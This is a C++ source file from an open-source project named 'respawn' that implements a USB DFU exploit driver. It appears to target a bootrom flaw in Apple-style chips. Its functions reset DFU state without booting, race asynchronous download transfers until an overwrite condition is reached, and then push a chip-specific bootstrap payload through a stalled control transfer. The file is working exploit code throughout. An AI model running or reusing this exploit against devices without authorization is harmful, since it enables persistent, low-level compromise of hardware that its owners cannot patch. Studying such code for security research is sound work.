//
//  Copyright (c) 2022-2023 Jon Palmisciano. All rights reserved.
//
//  Use of this source code is governed by the BSD 3-Clause license; a full
//  copy of the license can be found in the LICENSE.txt file.
//

#include "respawn/exploit/driver.h"

#include "respawn/dfu.h"
#include "respawn/payload/builder.h"
#include "respawn/usb/protocol.h"

#include <jsx/log.h>

#include <array>

ExploitDriver::ExploitDriver(UsbClient const &client, Chip chip,
                             bool dump_payloads)
    : UsbClient(client), m_chip(chip), m_dump_payloads(dump_payloads) {}

bool ExploitDriver::do_no_leak() {
  auto result = transfer_async(USB_RTF_HSD, USB_REQUEST_GET_DESCRIPTOR, 0x304,
                               USB_MAX_DESCRIPTOR_INDEX, nullptr,
                               3 * EP0_MAX_PACKET_SIZE + 1, 1);
  return result.length == 0;
}

void ExploitDriver::dump_payload(std::vector<uint8_t> const &payload,
                                 const std::string &name) {
  jsx::log_debug("Saving payload `%s.bin`...", name.c_str());

  auto file = std::fopen((name + ".bin").c_str(), "wb");
  std::fwrite(payload.data(), 1, payload.size(), file);
  std::fclose(file);
}

bool ExploitDriver::do_request_stall() {
  auto result = transfer(2, 3, 0, 0x80, nullptr, 0);
  return result.has_state(UsbTransferState::Stall);
}

bool ExploitDriver::do_request_leak() {
  auto result =
      transfer(USB_RTF_HSD, USB_REQUEST_GET_DESCRIPTOR, 0x304,
               USB_MAX_DESCRIPTOR_INDEX, nullptr, EP0_MAX_PACKET_SIZE);
  return result.length == 0;
}

bool ExploitDriver::run_reset_step() {
  // Either initiate a new DFU transfer phase, or continue an existing one by
  // sending an additional slice of data. In either case, ensure we are in the
  // transfer phase after this point.
  auto result = transfer(USB_RTF_DCI, DFU_REQUEST_DOWNLOAD, 0, 0, nullptr,
                         DFU_FILE_SUFFIX_SIZE);
  if (!result.is_ok(DFU_FILE_SUFFIX_SIZE)) {
    transfer(USB_RTF_DCI, DFU_REQUEST_CLEAR_STATUS, 0, 0, nullptr, 0);
    return false;
  }

  // End the DFU transfer phase by sending an empty slice.
  result = transfer(USB_RTF_DCI, DFU_REQUEST_DOWNLOAD, 0, 0, nullptr, 0);
  if (!result.is_ok(0)) {
    transfer(USB_RTF_DCI, DFU_REQUEST_CLEAR_STATUS, 0, 0, nullptr, 0);
    return false;
  }

  DfuStatusReply reply{};
  constexpr std::array state_cycle = {
      DFU_STATE_MANIFEST_SYNC,
      DFU_STATE_MANIFEST,
      DFU_STATE_MANIFEST_WAIT_RESET,
  };

  // Perform three status requests, as if we were about to boot whatever
  // garbage we just uploaded.
  for (const auto state : state_cycle) {
    result = transfer(USB_RTF_HCI, DFU_REQUEST_GET_STATUS, 0, 0, &reply, 6);
    if (!result.is_ok(sizeof(reply)))
      goto abort;
    if (!reply.has_state(DFU_STATUS_OK, state))
      goto abort;
  }

  // Notably, at this point, we don't do a USB reset (which would instruct the
  // device to boot whatever was uploaded), but rather, we start new DFU
  // transfer phase.
  result = transfer(USB_RTF_DCI, DFU_REQUEST_DOWNLOAD, 0, 0, nullptr,
                    EP0_MAX_PACKET_SIZE);
  if (!result.is_ok(EP0_MAX_PACKET_SIZE))
    goto abort;

  // If we made it here, a "clean slate" transfer phase state has been achieved
  // and the rest of the mischief can begin.
  return true;

abort:
  transfer(USB_RTF_DCI, DFU_REQUEST_CLEAR_STATUS, 0, 0, nullptr, 0);
  return false;
}

bool ExploitDriver::run_setup_step() {
  jsx::log_debug("Casting magic spell...");

  unsigned timeout = 0;
  for (;;) {
    auto result = transfer_async(USB_RTF_DCI, DFU_REQUEST_DOWNLOAD, 0, 0,
                                 nullptr, DFU_MAX_TRANSFER_SIZE, timeout);
    if (!result.is_ok())
      return false;

    auto overwrite_size = PayloadBuilder::overwrite_size(m_chip);
    if (result.length < overwrite_size) {
      result = transfer(0, 0, 0, 0, nullptr, overwrite_size - result.length);
      if (result.state != UsbTransferState::Stall)
        goto retry;

      transfer(USB_RTF_DCI, DFU_REQUEST_CLEAR_STATUS, 0, 0, nullptr, 0);
      return true;
    }

  retry:
    transfer(USB_RTF_DCI, DFU_REQUEST_DOWNLOAD, 0, 0, nullptr,
             EP0_MAX_PACKET_SIZE);

    timeout = (timeout + 1) % SIOKU_DEFAULT_USB_TIMEOUT;
  }
}

bool ExploitDriver::run_patch_step() {
  jsx::log_debug("Deploying bootstrap payload...");

  auto payload = PayloadBuilder::make_bootstrap(m_chip);
  if (m_dump_payloads)
    dump_payload(payload, "bootstrap");

  auto result = transfer(0, 0, 0, 0, payload);
  if (!result.has_state(UsbTransferState::Stall))
    return false;

  transfer(USB_RTF_DCI, DFU_REQUEST_DOWNLOAD, 0, 0, nullptr,
           EP0_MAX_PACKET_SIZE);
  transfer(USB_RTF_DCI, DFU_REQUEST_CLEAR_STATUS, 0, 0, nullptr, 0);
  return true;
}

bool ExploitDriver::run() {
  if (!run_reset_step()) {
    jsx::log_error("Error: Failed to perform pre-exploit reset.");
    return false;
  }

  reconnect();
  if (!run_setup_step()) {
    jsx::log_error("Error: Exploit conditions not achieved.");
    return false;
  }

  reconnect();
  if (!run_patch_step()) {
    jsx::log_error("Error: Exploit failed to deploy.");
    return false;
  }

  reconnect();
  return true;
}
